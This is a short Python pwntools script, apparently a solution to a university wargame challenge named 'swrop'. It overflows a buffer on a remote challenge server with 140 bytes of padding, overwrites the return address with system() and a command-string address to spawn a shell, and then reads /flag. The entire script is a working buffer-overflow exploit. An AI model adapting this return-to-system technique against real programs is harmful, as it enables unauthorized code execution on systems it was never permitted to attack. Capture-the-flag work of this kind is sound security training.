#!/usr/bin/python

from pwn import *

#c = process("./binaries/swrop")
c = remote("wargames.6447.sec.edu.au", 8003)
#c = gdb.debug("./binaries/swrop")

offset = 140
command = 0x08048600
system = 0x080484d8

payload = "a"*140
payload += p32(system)
payload += p32(command)

log.info("Sending payload...")
c.sendline(payload)
log.info("Executing shell...")
c.sendline("cat /flag")
c.recvlines(1)
flag = c.recvline()[2:]
log.success("Flag: %s" % (flag))

c.close()
